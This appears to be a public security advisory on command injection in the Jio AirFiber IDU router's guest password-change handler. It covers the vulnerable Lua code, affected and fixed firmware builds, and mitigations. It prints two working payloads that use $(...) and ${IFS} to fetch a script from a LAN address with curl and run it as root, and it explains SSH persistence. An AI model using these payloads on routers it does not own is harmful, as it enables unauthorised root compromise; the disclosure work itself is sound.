# Jio AirFiber IDU: command injection in `changeUserPassword`

**A logged-in web-UI session can run commands as root on the stock firmware, and
the only thing standing between the two is a password validator that allows
`$(...)`.**

Affected: Jio AirFiber IDU routers, MediaTek `6j01` builds `R2.0.19.6` through
`R3.2.0` and Qualcomm `6j11` builds up to at least `R3.2.6`.
Fixed by: `R3.2.3` on the MediaTek branch. Not fixed on the Qualcomm branch as
far as anyone has reported.

This is a write-up of behaviour already present in the routers you own, read out
of their own filesystem. Nothing here needs a cable, a soldering iron or a
downgrade.

---

## 1. Summary

The router's own web API has a password-change handler for the **guest**
account. Before it changes anything, it checks the new password against the last
three by hashing it — and it builds that hash command as a **string**, with the
password inside **double quotes**, then hands the string to `/bin/sh`.

`$(...)` inside double quotes is still evaluated. So the password field is a root
shell.

The validator that runs first does block `` ` `` `"` `'` `|` `;` and whitespace —
the characters you would reach for to write `curl … | sh`. It does **not** block
`$`, `(`, `)`, `{`, `}` or `${IFS}`, which is everything needed.

Two 32-character "passwords" are enough to get a persistent root shell:

```
Aa1$(curl${IFS}192.168.31.51>/a)      # 32 chars - fetch a script
Aa1$(sh${IFS}/a)                      # 16 chars - run it
```

The prefix is per-account trivia: the handler remembers the last three
passwords, and a fetch payload always evaluates to its own literal prefix, so it
never trips that history check.

## 2. The code

Read from a stock `JIDU6801` rootfs on `R2.0.19.6`.

`usr/lib/lua/luci/model/jio/rules/user.lua`:

```lua
local command = string.format(CONSTANTS.CMD_OPENSSL_HASH_PASSWORD, newPasswd, rsn)
local hashPassword = jioUtil.remove_newline(luci.sys.exec(command))
```

`usr/lib/lua/luci/model/jio/constants.lua:215`:

```lua
CMD_OPENSSL_HASH_PASSWORD = 'echo -n "%s" | openssl dgst -sha256 -mac HMAC -macopt key:%s | cut -d " " -f 2'
```

`%s` is the password, `"%s"` puts it in double quotes, `luci.sys.exec` runs the
result through `/bin/sh`. `savePasswdHistory` builds the same command a second
time when it records the new hash, so the injection fires twice.

The obvious suspect is a decoy. `setPassword` on the same build looks worse:

```lua
function setPassword(username, password)
	local resp = os.execute(
		"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
		.. "passwd '" .. username .. "' >/dev/null 2>&1")

	if tonumber(resp) == tonumber(0) then
		savePasswdHistory(username, password)
	end
	return resp
end
```

That one is single-quoted, so `$(...)` is literal there. The shell runs earlier,
in `checkPasswordHistory`, before `setPassword` is ever reached.

This matters for anyone testing the bug: on a build **without** the history
feature, this handler is not injectable at all, and the API still answers `OK`.
The payload is stored as a literal password, no shell evaluates it, and no
callback arrives. See §4.

## 3. The validator does not save you

From `rules/common/vlib.lua` and `rules/user.lua` on the same rootfs:

| Rule | Where | What it does |
| --- | --- | --- |
| 8–32 characters | `isStringValidLength(password, 8, 32)` | the whole budget for a payload |
| rejects `` ` `` `"` `'` `\|` `;` and whitespace | `hasValidChars1`, `^[^`\"'\|;%s]*$` | kills `curl … \| sh` |
| allows `$ ( ) { }` | nothing rejects them | command substitution survives |
| allows `${IFS}` | not whitespace | arguments without a literal space |

`${IFS}` is not a curiosity here — it is the only way to pass an argument,
because a literal space is rejected before the password is ever hashed.

`/a` is the shortest path writable as root on this rootfs, which caps the
download address at 13 characters. `192.168.31.51` fits exactly.

## 4. Affected and fixed builds

The families ship separate firmware branches. `check` reports on this handler
only — it is not an audit of the rest of the firmware.

| Family | Build | Vulnerable | Why |
| --- | --- | :---: | --- |
| MediaTek `6j01` | `R2.0.18.x` and older | No | no `checkPasswordHistory` / `savePasswdHistory` at all; read from a 18.2 rootfs |
| MediaTek `6j01` | `R2.0.19.0` – `R2.0.19.5` | Untested | no rootfs read; the history feature landed somewhere in this window |
| MediaTek `6j01` | `R2.0.19.6` – `R3.2.0` | **Yes** | 19.6 rootfs has the double-quoted hash; 3.2.0 confirmed in the field |
| MediaTek `6j01` | `R3.2.1` – `R3.2.2` | Untested | fix landed between 3.2.0 and 3.2.3 |
| MediaTek `6j01` | `R3.2.3` and newer | No | `luci.sys.user.setpasswd` replaced the shell-out |
| Qualcomm `6j11` | `R3.2.6` and older | **Yes** | confirmed on a unit running 3.2.6; older builds may predate the history feature |
| Qualcomm `6j11` | `R3.2.7` and newer | Unknown | no datapoint |

The vendor's own comment in `R3.2.3` names the bug
(`usr/lib/lua/luci/model/jio/session.lua`):

```lua
--[[ local resp = os.execute(
	"(echo '" .. password .. "'; sleep 1; echo '" .. password .. "') | "
	.. "passwd '" .. username .. "' >/dev/null 2>&1"
) ]]

-- use in build luci.sys.user util to avoid any shell injection not taken care at application level
local resp = luci.sys.user.setpasswd(username, password)
```

*"shell injection not taken care at application level"*. `luci.sys.user.setpasswd`
passes the password as an argument instead of through a shell, which is the fix.
It has not reached the Qualcomm branch.

A version string is a hint, not a verdict, so the reliable test is a runtime
probe: change the **guest** password once to a random literal and re-read the
guest record. A new `passwdHistory` entry means `savePasswdHistory` ran, and that
the vulnerable shell-out exists. No entry means the handler cannot be injected —
which is exactly the trap described in §2.

## 5. Impact

- **Authenticated → root.** Any holder of the admin password, and anyone who
  talks the router into accepting an admin session, gets arbitrary command
  execution as root.
- **Persistence.** Root means `/etc/init.d/`, so SSH survives reboots. The
  vendor's `/etc/init.d/dropbear` force-disables SSH on every boot of a release
  build, but a script ordered after it (`START=99`) starts it again.
- **Not a network unlock.** It does not touch SIM, IMEI or carrier settings. It
  is a router compromise, not a carrier bypass.
- **Blast radius.** The router holds the WAN credentials, the Wi-Fi PSK, and on
  these units the fabric of the home network behind it.

The threat this poses depends entirely on who can reach LuCI. Exposed to the
internet, it is remote code execution. On a home LAN, it is privilege escalation
from "can log in to the router" to "owns the router".

## 6. Mitigation

**If you run stock firmware**

- Update to `R3.2.3` or newer on MediaTek. That is the build where the shell-out
  is gone.
- On Qualcomm `6j11`, no fixed build has been reported. Treat the web UI as a
  trusted-network-only surface.
- Keep LuCI off the WAN. If it is reachable from outside, this bug is the least
  of your problems, but it is also directly exploitable.
- A longer admin password does not help: the attacker is already authenticated.

**If you run OpenWrt instead**

This handler does not exist there. Replacing the firmware removes the bug and
the vendor's boot-time SSH suppression with it. That is what
[`idu-unlock`](https://github.com/wpfyorg/idu-unlock) is for — and it does not
exploit anything to flash: it uses this injection once, over your own LAN, to
get a shell you already have physical access to.

## 7. Timeline and disclosure

- The handler was read out of stock rootfs images pulled from units on this
  desk. There was no coordinated disclosure and no bug bounty: the firmware is
  shipped to the person who owns the device, and the files are on it.
- Fixed by `R3.2.3` on the MediaTek branch, and the fix is the vendor's own -
  their comment names the bug. It did not come from a report of ours.
- Qualcomm branch: vulnerable at `R3.2.6` as of the last report, and no later
  build has been checked.
- Published alongside a working, documented tool rather than on its own,
  because "your router has a bug" is not actionable and "here is how to keep
  the hardware" is.

## 8. Why this is public

Because the alternative is scrap. These are 2023-era routers with a signed
bootloader, sold with a carrier lock and a carrier's idea of a web UI. When the
service ends, or the unit is replaced, the hardware still works — the software
is just pointed at a server that no longer answers.

Knowing what is broken is the difference between "e-waste" and "a router with
OpenWrt on it". That is the whole point.

We are not a company, we are not a security team, and we are not your vendor.
We publish what we find because withholding it helps nobody except the people
reselling these units at a markup.

## 9. Credit

- [`wpfyorg/idu-unlock`](https://github.com/wpfyorg/idu-unlock) — the tool and
  the rootfs reading this is based on.
- [`the-diy-daddy/6j01_6j11`](https://github.com/the-diy-daddy/6j01_6j11) — the
  two-stage OpenWrt install this builds on.

## 10. Licence

Text and code excerpts: **CC BY 4.0**. Quote it, mirror it, put it in a video,
translate it, teach from it — credit this repo and you are done. No permission
needed, no email, no wait.

Only use any of this on hardware you own or are explicitly authorised to test.
Provided as is, without warranty, without liability.
